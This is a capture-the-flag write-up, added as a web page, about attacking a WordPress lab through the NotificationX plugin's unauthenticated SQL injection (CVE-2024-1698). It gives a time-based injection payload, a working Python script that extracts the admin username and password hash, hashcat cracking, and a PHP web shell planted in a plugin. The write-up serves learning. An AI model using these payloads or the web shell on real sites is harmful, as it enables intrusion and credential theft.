@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>NotificationX | H4rm0ny Hub</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../../../../css/style.css" />
+</head>
+<body class="scanlines">
+  <div class="scroll-progress" aria-hidden="true"></div>
+  <div class="vignette" aria-hidden="true"></div>
+  <div class="scan-line" aria-hidden="true"></div>
+  <canvas id="hex-canvas" aria-hidden="true"></canvas>
+  <div class="cursor-glow" aria-hidden="true"></div>
+  
+  <main class="page writeup-page">
+    
+    <p class="back-link"><a href="../../../../index.html">â† cd ../hub</a></p>
+    <header class="hero writeup-hero visible" id="hero" data-section>
+      <div class="hero-inner">
+        <div class="hero-avatar-wrap"><img class="hero-avatar" src="avatar.png" alt="" loading="eager" /></div>
+        <h1 class="hero-name">NotificationX</h1>
+        <p class="hero-title">Medium â€¢ Linux â€¢ Infinity Learning â€¢ 2026-05-20</p>
+        <p class="hero-summary">Exploiting an unauthenticated SQL Injection in the NotificationX WordPress plugin to extract admin credentials and achieve RCE.</p>
+      </div>
+    </header>
+
+    <section class="section visible" id="content" data-section>
+      <div class="section-header">
+        <div class="section-hex" aria-hidden="true"></div>
+        <h2 class="section-title"><span>//</span> WRITEUP</h2>
+      </div>
+      <article class="panel md-content"><h1>On-Premise-09: NotificationX</h1>
+<h2>Introduction</h2>
+<p>This report details the exploitation of a WordPress-based lab environment, <strong>On-Premise-09: NotificationX</strong>, part of the Infinity Learning labs. The objective was to identify vulnerabilities, gain unauthorized access, and ultimately retrieve the flag.</p>
+<h2>Reconnaissance</h2>
+<p>The initial phase involved examining the target webpage. Using <strong>Wappalyzer</strong></p>
+<p><img alt="Wappalyzer and Initial Recon" src="image.png" /></p>
+<p> I identified that the site is running on <strong>WordPress</strong>. This discovery prompted further enumeration using <strong>WPScan</strong>.</p>
+<h3>Initial Plugin Enumeration</h3>
+<p>I began by enumerating the installed plugins using the following command:</p>
+<pre><code>❯ wpscan --url https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/ --enumerate p
+
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/ [173.208.132.134]
+[+] Started: Wed May 20 09:38:20 2026
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: nginx/1.18.0 (Ubuntu)
+ |  - X-UA-Compatible: IE=edge
+ |  - Content-Security-Policy: upgrade-insecure-requests
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.6.2 identified (Insecure, released on 2024-09-10).
+ | Found By: Rss Generator (Passive Detection)
+ |  - https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.6.2&lt;/generator&gt;
+ |  - https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.6.2&lt;/generator&gt;
+
+[+] WordPress theme in use: bloghash
+ | Location: https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/wp-content/themes/bloghash/
+ | Last Updated: 2026-02-25T00:00:00.000Z
+ | Readme: https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/wp-content/themes/bloghash/readme.txt
+ | [!] The version is out of date, the latest version is 1.0.28
+ | Style URL: https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/wp-content/themes/bloghash/style.css
+ | Style Name: BlogHash
+ | Style URI: https://peregrine-themes.com/bloghash
+ | Description: BlogHash is the perfect pick for bloggers seeking a lightweight, customizable theme that suits them ...
+ | Author: Peregrine themes
+ | Author URI: https://peregrine-themes.com/
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.0.16 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/wp-content/themes/bloghash/style.css, Match: 'Version: 1.0.16'
+
+[+] Enumerating Most Popular Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed May 20 09:38:30 2026
+[+] Requests Done: 30
+[+] Cached Requests: 5
+[+] Data Sent: 12.217 KB
+[+] Data Received: 134.009 KB
+[+] Memory used: 271.051 MB
+[+] Elapsed time: 00:00:10
+</code></pre>
+<p>The scan results provided several interesting findings:</p>
+<ul>
+<li><strong>Server:</strong> nginx/1.18.0 (Ubuntu)</li>
+<li><strong>XML-RPC:</strong> Enabled at <code>/xmlrpc.php</code></li>
+<li><strong>WordPress Version:</strong> 6.6.2 (Identified as insecure)</li>
+<li><strong>Theme:</strong> BlogHash (Version 1.0.16)</li>
+<li><strong>Upload Directory:</strong> Directory listing enabled at <code>/wp-content/uploads/</code></li>
+</ul>
+<p>However, the passive plugin enumeration did not yield significant results. To gain more visibility, I performed an aggressive plugin scan:</p>
+<pre><code>❯ wpscan --url https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/ --enumerate p --plugins-detection aggressive</code></pre>
+<h3>Vulnerability Identification</h3>
+<p>The aggressive scan successfully identified a specific plugin and its version. Research revealed that this plugin was subject to a critical vulnerability: <strong>CVE-2024-1698</strong>, an unauthenticated SQL Injection.</p>
+<blockquote>
+<p>The <strong>NotificationX</strong> plugin for WordPress is vulnerable to SQL Injection via the <code>type</code> parameter in all versions up to and including <strong>2.8.2</strong>. This is due to insufficient escaping of user-supplied parameters and a lack of preparation in the existing SQL query.</p>
+</blockquote>
+<p><img alt="Aggressive Scan Results" src="image%201.png" /></p>
+<h2>Exploitation  </h2>
+<h3>Testing the API Endpoint</h3>
+<p>Following exploitation guides, I attempted to access the REST API. I encountered an issue where the standard <code>/wp-json</code> endpoint was not available. I later learned that WordPress supports two methods for REST API access:</p>
+<p>1. <strong>Pretty Permalinks ON:</strong> <code>/wp-json/notificationx/v1/analytics</code></p>
+<p>2. <strong>Pretty Permalinks OFF:</strong> <code>/?rest_route=/notificationx/v1/analytics</code></p>
+<p>Since Pretty Permalinks were disabled, I used the second method to confirm the API's existence:</p>
+<pre><code>curl -s &quot;https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/?rest_route=/notificationx/v1/analytics&quot; \
+  -d &quot;nx_id=1&amp;type=clicks&quot;</code></pre>
+<p><img alt="API Confirmation" src="image%202.png" /></p>
+<h3>Time-Based SQL Injection</h3>
+<p>To verify the SQL injection, I executed a time-based payload:</p>
+<pre><code>time curl &quot;https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/?rest_route=/notificationx/v1/analytics&quot; \
+  -d 'nx_id=1337&amp;type=clicks`=IF(SUBSTRING(version(),1,1)=5,SLEEP(10),null)-- -'
+  </code></pre>
+<p>The server responded with a significant delay (approximately 20 seconds), confirming the vulnerability.</p>
+<p><img alt="SQL Injection Delay" src="image%203.png" /></p>
+<h3>Automated Data Extraction</h3>
+<p>I utilized a publicly available exploit script but had to modify it due to issues with automatic length detection. I manually set the character range and added a more robust delay checker.</p>
+<pre><code>import requests
+import string
+from sys import exit
+import time
+
+delay = 10
+url = &quot;https://red.infinity.cyberwarfare.live/oaa06a4ab7464a7388724290d69bd32t/?rest_route=/notificationx/v1/analytics&quot;
+admin_username = &quot;&quot;
+admin_password_hash = &quot;&quot;
+session = requests.Session()
+
+def check_char(payload):
+    for _ in range(2):
+        resp = session.post(url, data={&quot;nx_id&quot;: 1337, &quot;type&quot;: payload})
+        if resp.elapsed.total_seconds() &gt; delay:
+            continue
+        return False
+    return True
+
+print(&quot;Extracting Admin Username...&quot;)
+for idx_username in range(1, 20):
+    for ascii_val_username in (b&quot;\x00&quot; + string.printable.encode()):
+        payload = f&quot;clicks`=IF(ASCII(SUBSTRING((select user_login from wp_users where id=1),{idx_username},1))={ascii_val_username},SLEEP({delay}),null)-- -&quot;
+        if check_char(payload):
+            if ascii_val_username == 0:
+                break
+            admin_username += chr(ascii_val_username)
+            print(&quot;Admin username:&quot;, admin_username)
+            break
+    else:
+        break
+
+print(&quot;Extracting Password Hash...&quot;)
+for idx_password in range(1, 41):
+    for ascii_val_password in (b&quot;\x00&quot; + string.printable.encode()):
+        payload = f&quot;clicks`=IF(ASCII(SUBSTRING((select user_pass from wp_users where id=1),{idx_password},1))={ascii_val_password},SLEEP({delay}),null)-- -&quot;
+        if check_char(payload):
+            if ascii_val_password == 0:
+                print(&quot;Username:&quot;, admin_username)
+                print(&quot;Password hash:&quot;, admin_password_hash)
+                exit(0)
+            admin_password_hash += chr(ascii_val_password)
+            print(&quot;Admin password hash:&quot;, admin_password_hash)
+            break</code></pre>
+<p>Running the script successfully extracted the administrator's username and password hash.</p>
+<p><img alt="Extraction Process 1" src="image%204.png" /></p>
+<p><img alt="Extraction Process 2" src="image%205.png" /></p>
+<h3>Password Cracking</h3>
+<p>The extracted hash was identified as a <strong>WordPress MD5</strong> hash. I used <strong>Hashcat</strong> with mode <code>400</code> and the <code>rockyou.txt</code> wordlist to crack it.</p>
+<pre><code>hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt --force</code></pre>
+<p><img alt="Hashcat Results" src="image%206.png" /></p>
+<h2>Post-Exploitation</h2>
+<h3>Gaining Remote Code Execution (RCE)</h3>
+<p>With the admin credentials, I logged into the WordPress dashboard. Although direct plugin uploads failed due to connection errors, I was able to gain RCE by editing an existing plugin, <strong>Hester Core</strong>, and inserting a PHP shell:</p>
+<pre><code>system($_GET['cmd']);</code></pre>
+<p><img alt="Admin Panel Login" src="image%207.png" /></p>
+<h3>Retrieving the Flag</h3>
+<p>I then used the <code>cmd</code> parameter to execute system commands. By listing the directory contents and reading the flag file, I successfully completed the challenge.</p>
+<p><img alt="RCE Confirmation" src="image%208.png" /></p>
+<p><img alt="System Commands" src="image%209.png" /></p>
+<p><img alt="Flag Retrieval" src="image%2010.png" /></p>
+<p>The flag was successfully retrieved, marking the completion of the lab. :)</p>
+</article>
+    </section>
+    <footer>
+      <span class="hex-dot" aria-hidden="true"></span>
+      H4rm0ny Content Hub &copy; 2026
+      <span class="hex-dot" aria-hidden="true"></span>
+    </footer>
+  </main>
+  <script type="module" src="../../../../js/main.js"></script>
+</body>
+</html>
